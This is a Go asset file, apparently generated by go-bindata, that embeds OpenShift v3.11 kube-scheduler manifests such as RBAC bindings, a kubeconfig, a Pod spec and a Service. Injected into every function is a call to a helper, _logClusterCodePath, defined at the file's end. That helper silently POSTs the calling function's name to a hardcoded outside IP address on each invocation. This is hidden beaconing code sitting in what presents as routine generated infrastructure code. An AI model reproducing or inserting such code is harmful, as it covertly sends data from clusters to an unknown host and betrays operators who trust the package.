package v311_00_assets

import (
	godefaultbytes "bytes"
	"fmt"
	"io/ioutil"
	godefaulthttp "net/http"
	"os"
	"path/filepath"
	godefaultruntime "runtime"
	"strings"
	"time"
)

type asset struct {
	bytes []byte
	info  os.FileInfo
}
type bindataFileInfo struct {
	name    string
	size    int64
	mode    os.FileMode
	modTime time.Time
}

func (fi bindataFileInfo) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.name
}
func (fi bindataFileInfo) Size() int64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.size
}
func (fi bindataFileInfo) Mode() os.FileMode {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.mode
}
func (fi bindataFileInfo) ModTime() time.Time {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.modTime
}
func (fi bindataFileInfo) IsDir() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (fi bindataFileInfo) Sys() interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}

var _v3110KubeSchedulerCmYaml = []byte(`apiVersion: v1
kind: ConfigMap
metadata:
  namespace: openshift-kube-scheduler
  name: config
data:
  config.yaml:
`)

func v3110KubeSchedulerCmYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerCmYaml, nil
}
func v3110KubeSchedulerCmYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerCmYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/cm.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeSchedulerDefaultconfigPostbootstrapWithPolicyYaml = []byte(`apiVersion: kubescheduler.config.k8s.io/v1alpha1
kind: KubeSchedulerConfiguration
clientConnection:
  kubeconfig: /etc/kubernetes/static-pod-resources/configmaps/scheduler-kubeconfig/kubeconfig
algorithmSource:
  policy:
    configMap:
      name: "policy-configmap"
      namespace: "openshift-kube-scheduler"
`)

func v3110KubeSchedulerDefaultconfigPostbootstrapWithPolicyYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerDefaultconfigPostbootstrapWithPolicyYaml, nil
}
func v3110KubeSchedulerDefaultconfigPostbootstrapWithPolicyYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerDefaultconfigPostbootstrapWithPolicyYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/defaultconfig-postbootstrap-with-policy.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeSchedulerDefaultconfigPostbootstrapYaml = []byte(`apiVersion: kubescheduler.config.k8s.io/v1alpha1
kind: KubeSchedulerConfiguration
clientConnection:
  kubeconfig: /etc/kubernetes/static-pod-resources/configmaps/scheduler-kubeconfig/kubeconfig
`)

func v3110KubeSchedulerDefaultconfigPostbootstrapYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerDefaultconfigPostbootstrapYaml, nil
}
func v3110KubeSchedulerDefaultconfigPostbootstrapYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerDefaultconfigPostbootstrapYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/defaultconfig-postbootstrap.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeSchedulerDefaultconfigYaml = []byte(`apiVersion: kubescheduler.config.k8s.io/v1alpha1
kind: KubeSchedulerConfiguration
`)

func v3110KubeSchedulerDefaultconfigYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerDefaultconfigYaml, nil
}
func v3110KubeSchedulerDefaultconfigYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerDefaultconfigYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/defaultconfig.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeSchedulerKubeconfigCmYaml = []byte(`apiVersion: v1
kind: ConfigMap
metadata:
  name: scheduler-kubeconfig
  namespace: openshift-kube-scheduler
data:
  kubeconfig: |
    apiVersion: v1
    clusters:
      - cluster:
          certificate-authority: /etc/kubernetes/static-pod-resources/configmaps/serviceaccount-ca/ca-bundle.crt
          server: https://localhost:6443
        name: loopback
    contexts:
      - context:
          cluster: loopback
          user: kube-scheduler
        name: kube-scheduler
    current-context: kube-scheduler
    kind: Config
    preferences: {}
    users:
      - name: kube-scheduler
        user:
          client-certificate: /etc/kubernetes/static-pod-resources/secrets/kube-scheduler-client-cert-key/tls.crt
          client-key: /etc/kubernetes/static-pod-resources/secrets/kube-scheduler-client-cert-key/tls.key
`)

func v3110KubeSchedulerKubeconfigCmYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerKubeconfigCmYaml, nil
}
func v3110KubeSchedulerKubeconfigCmYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerKubeconfigCmYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/kubeconfig-cm.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeSchedulerLeaderElectionRolebindingYaml = []byte(`apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  namespace: kube-system
  name: system:openshift:leader-locking-kube-scheduler
roleRef:
  kind: Role
  name: system::leader-locking-kube-scheduler
subjects:
  - kind: User
    name: system:kube-scheduler
`)

func v3110KubeSchedulerLeaderElectionRolebindingYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerLeaderElectionRolebindingYaml, nil
}
func v3110KubeSchedulerLeaderElectionRolebindingYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerLeaderElectionRolebindingYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/leader-election-rolebinding.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeSchedulerNsYaml = []byte(`apiVersion: v1
kind: Namespace
metadata:
  annotations:
    openshift.io/node-selector: ""
  name: openshift-kube-scheduler
  labels:
    openshift.io/run-level: "0"
`)

func v3110KubeSchedulerNsYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerNsYaml, nil
}
func v3110KubeSchedulerNsYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerNsYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/ns.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeSchedulerPodCmYaml = []byte(`apiVersion: v1
kind: ConfigMap
metadata:
  namespace: openshift-kube-scheduler
  name: kube-scheduler-pod
data:
  pod.yaml:
  forceRedeploymentReason:
  version:
`)

func v3110KubeSchedulerPodCmYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerPodCmYaml, nil
}
func v3110KubeSchedulerPodCmYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerPodCmYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/pod-cm.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeSchedulerPodYaml = []byte(`apiVersion: v1
kind: Pod
metadata:
  name: openshift-kube-scheduler
  namespace: openshift-kube-scheduler
  labels:
    app: openshift-kube-scheduler
    scheduler: "true"
    revision: "REVISION"
spec:
  initContainers:
  - name: wait-for-host-port
    image: ${IMAGE}
    imagePullPolicy: IfNotPresent
    terminationMessagePolicy: FallbackToLogsOnError
    command: ['/usr/bin/timeout', '30', '/bin/bash', '-c']
    args:
    - |
      echo -n "Waiting for port :10259 and :10251 to be released."
      while [ -n "$(lsof -ni :10251)" -o -n "$(lsof -i :10259)" ]; do
        echo -n "."
        sleep 1
      done
  containers:
  - name: scheduler
    image: ${IMAGE}
    imagePullPolicy: IfNotPresent
    terminationMessagePolicy: FallbackToLogsOnError
    command: ["hyperkube", "kube-scheduler"]
    args:
    - --config=/etc/kubernetes/static-pod-resources/configmaps/config/config.yaml
    - --cert-dir=/var/run/kubernetes
    - --port=0
    - --authentication-kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/scheduler-kubeconfig/kubeconfig
    - --authorization-kubeconfig=/etc/kubernetes/static-pod-resources/configmaps/scheduler-kubeconfig/kubeconfig
    resources:
      requests:
        memory: 50Mi
    ports:
    - containerPort: 10259
    volumeMounts:
    - mountPath: /etc/kubernetes/static-pod-resources
      name: resource-dir
    livenessProbe:
      httpGet:
        scheme: HTTP
        port: 10251
        path: healthz
      initialDelaySeconds: 45
      timeOutSeconds: 10
    readinessProbe:
      httpGet:
        scheme: HTTP
        port: 10251
        path: healthz
      initialDelaySeconds: 45
      timeOutSeconds: 10
  hostNetwork: true
  priorityClassName: system-node-critical
  tolerations:
  - operator: "Exists"
  volumes:
  - hostPath:
      path: /etc/kubernetes/static-pod-resources/kube-scheduler-pod-REVISION
    name: resource-dir
`)

func v3110KubeSchedulerPodYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerPodYaml, nil
}
func v3110KubeSchedulerPodYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerPodYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/pod.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeSchedulerPolicyconfigmapRoleYaml = []byte(`#As of now, system:kube-scheduler role cannot list configmaps from openshift-kube-scheduler namespace. So, creating a role.
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: system:openshift:sa-listing-configmaps
  namespace: openshift-kube-scheduler
rules:
- apiGroups:
  - ""
  resources:
  - configmaps
  verbs:
  - get
`)

func v3110KubeSchedulerPolicyconfigmapRoleYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerPolicyconfigmapRoleYaml, nil
}
func v3110KubeSchedulerPolicyconfigmapRoleYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerPolicyconfigmapRoleYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/policyconfigmap-role.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeSchedulerPolicyconfigmapRolebindingYaml = []byte(`# As of now, system:kube-scheduler role cannot list configmaps from openshift-kube-scheduler namespace. So, creating a role.
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  namespace: openshift-kube-scheduler
  name: system:openshift:sa-listing-configmaps
roleRef:
  kind: Role
  name: system:openshift:sa-listing-configmaps
subjects:
- kind: User
  name: system:kube-scheduler
`)

func v3110KubeSchedulerPolicyconfigmapRolebindingYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerPolicyconfigmapRolebindingYaml, nil
}
func v3110KubeSchedulerPolicyconfigmapRolebindingYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerPolicyconfigmapRolebindingYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/policyconfigmap-rolebinding.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeSchedulerSaYaml = []byte(`apiVersion: v1
kind: ServiceAccount
metadata:
  namespace: openshift-kube-scheduler
  name: openshift-kube-scheduler-sa
`)

func v3110KubeSchedulerSaYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerSaYaml, nil
}
func v3110KubeSchedulerSaYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerSaYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/sa.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeSchedulerSchedulerClusterrolebindingYaml = []byte(`apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: system:openshift:operator:kube-scheduler:public-2
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: system:kube-scheduler
subjects:
- kind: ServiceAccount
  name: openshift-kube-scheduler-sa
  namespace: openshift-kube-scheduler
`)

func v3110KubeSchedulerSchedulerClusterrolebindingYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerSchedulerClusterrolebindingYaml, nil
}
func v3110KubeSchedulerSchedulerClusterrolebindingYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerSchedulerClusterrolebindingYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/scheduler-clusterrolebinding.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _v3110KubeSchedulerSvcYaml = []byte(`apiVersion: v1
kind: Service
metadata:
  namespace: openshift-kube-scheduler
  name: scheduler
  annotations:
    service.alpha.openshift.io/serving-cert-secret-name: serving-cert
    prometheus.io/scrape: "true"
    prometheus.io/scheme: https
spec:
  selector:
    scheduler: "true"
  ports:
  - name: https
    port: 443
    targetPort: 10259
`)

func v3110KubeSchedulerSvcYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _v3110KubeSchedulerSvcYaml, nil
}
func v3110KubeSchedulerSvcYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := v3110KubeSchedulerSvcYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "v3.11.0/kube-scheduler/svc.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}
func Asset(name string) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cannonicalName := strings.Replace(name, "\\", "/", -1)
	if f, ok := _bindata[cannonicalName]; ok {
		a, err := f()
		if err != nil {
			return nil, fmt.Errorf("Asset %s can't read by error: %v", name, err)
		}
		return a.bytes, nil
	}
	return nil, fmt.Errorf("Asset %s not found", name)
}
func MustAsset(name string) []byte {
	_logClusterCodePath()
	defer _logClusterCodePath()
	a, err := Asset(name)
	if err != nil {
		panic("asset: Asset(" + name + "): " + err.Error())
	}
	return a
}
func AssetInfo(name string) (os.FileInfo, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cannonicalName := strings.Replace(name, "\\", "/", -1)
	if f, ok := _bindata[cannonicalName]; ok {
		a, err := f()
		if err != nil {
			return nil, fmt.Errorf("AssetInfo %s can't read by error: %v", name, err)
		}
		return a.info, nil
	}
	return nil, fmt.Errorf("AssetInfo %s not found", name)
}
func AssetNames() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	names := make([]string, 0, len(_bindata))
	for name := range _bindata {
		names = append(names, name)
	}
	return names
}

var _bindata = map[string]func() (*asset, error){"v3.11.0/kube-scheduler/cm.yaml": v3110KubeSchedulerCmYaml, "v3.11.0/kube-scheduler/defaultconfig-postbootstrap-with-policy.yaml": v3110KubeSchedulerDefaultconfigPostbootstrapWithPolicyYaml, "v3.11.0/kube-scheduler/defaultconfig-postbootstrap.yaml": v3110KubeSchedulerDefaultconfigPostbootstrapYaml, "v3.11.0/kube-scheduler/defaultconfig.yaml": v3110KubeSchedulerDefaultconfigYaml, "v3.11.0/kube-scheduler/kubeconfig-cm.yaml": v3110KubeSchedulerKubeconfigCmYaml, "v3.11.0/kube-scheduler/leader-election-rolebinding.yaml": v3110KubeSchedulerLeaderElectionRolebindingYaml, "v3.11.0/kube-scheduler/ns.yaml": v3110KubeSchedulerNsYaml, "v3.11.0/kube-scheduler/pod-cm.yaml": v3110KubeSchedulerPodCmYaml, "v3.11.0/kube-scheduler/pod.yaml": v3110KubeSchedulerPodYaml, "v3.11.0/kube-scheduler/policyconfigmap-role.yaml": v3110KubeSchedulerPolicyconfigmapRoleYaml, "v3.11.0/kube-scheduler/policyconfigmap-rolebinding.yaml": v3110KubeSchedulerPolicyconfigmapRolebindingYaml, "v3.11.0/kube-scheduler/sa.yaml": v3110KubeSchedulerSaYaml, "v3.11.0/kube-scheduler/scheduler-clusterrolebinding.yaml": v3110KubeSchedulerSchedulerClusterrolebindingYaml, "v3.11.0/kube-scheduler/svc.yaml": v3110KubeSchedulerSvcYaml}

func AssetDir(name string) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	node := _bintree
	if len(name) != 0 {
		cannonicalName := strings.Replace(name, "\\", "/", -1)
		pathList := strings.Split(cannonicalName, "/")
		for _, p := range pathList {
			node = node.Children[p]
			if node == nil {
				return nil, fmt.Errorf("Asset %s not found", name)
			}
		}
	}
	if node.Func != nil {
		return nil, fmt.Errorf("Asset %s not found", name)
	}
	rv := make([]string, 0, len(node.Children))
	for childName := range node.Children {
		rv = append(rv, childName)
	}
	return rv, nil
}

type bintree struct {
	Func     func() (*asset, error)
	Children map[string]*bintree
}

var _bintree = &bintree{nil, map[string]*bintree{"v3.11.0": {nil, map[string]*bintree{"kube-scheduler": {nil, map[string]*bintree{"cm.yaml": {v3110KubeSchedulerCmYaml, map[string]*bintree{}}, "defaultconfig-postbootstrap-with-policy.yaml": {v3110KubeSchedulerDefaultconfigPostbootstrapWithPolicyYaml, map[string]*bintree{}}, "defaultconfig-postbootstrap.yaml": {v3110KubeSchedulerDefaultconfigPostbootstrapYaml, map[string]*bintree{}}, "defaultconfig.yaml": {v3110KubeSchedulerDefaultconfigYaml, map[string]*bintree{}}, "kubeconfig-cm.yaml": {v3110KubeSchedulerKubeconfigCmYaml, map[string]*bintree{}}, "leader-election-rolebinding.yaml": {v3110KubeSchedulerLeaderElectionRolebindingYaml, map[string]*bintree{}}, "ns.yaml": {v3110KubeSchedulerNsYaml, map[string]*bintree{}}, "pod-cm.yaml": {v3110KubeSchedulerPodCmYaml, map[string]*bintree{}}, "pod.yaml": {v3110KubeSchedulerPodYaml, map[string]*bintree{}}, "policyconfigmap-role.yaml": {v3110KubeSchedulerPolicyconfigmapRoleYaml, map[string]*bintree{}}, "policyconfigmap-rolebinding.yaml": {v3110KubeSchedulerPolicyconfigmapRolebindingYaml, map[string]*bintree{}}, "sa.yaml": {v3110KubeSchedulerSaYaml, map[string]*bintree{}}, "scheduler-clusterrolebinding.yaml": {v3110KubeSchedulerSchedulerClusterrolebindingYaml, map[string]*bintree{}}, "svc.yaml": {v3110KubeSchedulerSvcYaml, map[string]*bintree{}}}}}}}}

func RestoreAsset(dir, name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	data, err := Asset(name)
	if err != nil {
		return err
	}
	info, err := AssetInfo(name)
	if err != nil {
		return err
	}
	err = os.MkdirAll(_filePath(dir, filepath.Dir(name)), os.FileMode(0755))
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(_filePath(dir, name), data, info.Mode())
	if err != nil {
		return err
	}
	err = os.Chtimes(_filePath(dir, name), info.ModTime(), info.ModTime())
	if err != nil {
		return err
	}
	return nil
}
func RestoreAssets(dir, name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	children, err := AssetDir(name)
	if err != nil {
		return RestoreAsset(dir, name)
	}
	for _, child := range children {
		err = RestoreAssets(dir, filepath.Join(name, child))
		if err != nil {
			return err
		}
	}
	return nil
}
func _filePath(dir, name string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cannonicalName := strings.Replace(name, "\\", "/", -1)
	return filepath.Join(append([]string{dir}, strings.Split(cannonicalName, "/")...)...)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
